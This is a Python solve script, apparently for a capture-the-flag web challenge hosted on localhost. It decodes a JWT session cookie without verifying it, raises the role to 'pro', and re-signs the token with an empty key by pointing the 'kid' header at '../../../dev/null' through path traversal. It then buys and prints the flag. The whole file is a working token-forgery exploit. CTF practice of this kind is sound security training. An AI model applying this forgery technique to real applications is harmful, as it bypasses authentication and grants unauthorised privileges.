import requests
import jwt
import re

DOMAIN = "127.0.0.1"
CHALL_URL = "http://127.0.0.1:50000"

s = requests.Session()

res = s.post(f"{CHALL_URL}/signup", data={"name": "abc123"})

jwt_token = s.cookies.get_dict()["token"]

payload = jwt.decode(
    jwt_token, algorithms=["HS256"], options={"verify_signature": False}
)
payload["role"] = "pro"

file_path = "../../../dev/null"
file_contents = ""

new_jwt = jwt.encode(
    payload, file_contents, algorithm="HS256", headers={"kid": file_path}
)

s.cookies.set("token", new_jwt, domain=DOMAIN)
jwt_token = s.cookies.get_dict()["token"]

for i in range(5):
    res = s.post(f"{CHALL_URL}/click")

res = s.post(f"{CHALL_URL}/buy", json={"item": "flag"})

res = s.get(f"{CHALL_URL}/play")

flag = re.search(r"SNHT{.*}", res.text).group()
print(flag)
